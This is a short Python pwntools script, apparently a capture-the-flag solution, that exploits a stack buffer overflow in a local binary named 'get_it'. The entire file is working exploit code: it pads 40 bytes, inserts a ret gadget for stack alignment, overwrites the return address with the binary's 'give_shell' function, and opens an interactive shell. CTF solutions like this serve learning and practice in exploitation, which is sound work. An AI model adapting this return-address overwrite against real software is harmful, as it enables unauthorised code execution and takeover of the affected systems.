from pwn import *

context.log_level = "debug"

p = process(b"./get_it")

e = ELF(b"./get_it")
give_shell_addr = e.symbols["give_shell"]

r = ROP(e)
ret_addr = r.find_gadget(["ret"]).address

payload = b"A" * 40
payload += p64(ret_addr)
payload += p64(give_shell_addr)

p.recvuntil("Do you gets it??\n")
p.sendline(payload)
p.interactive()
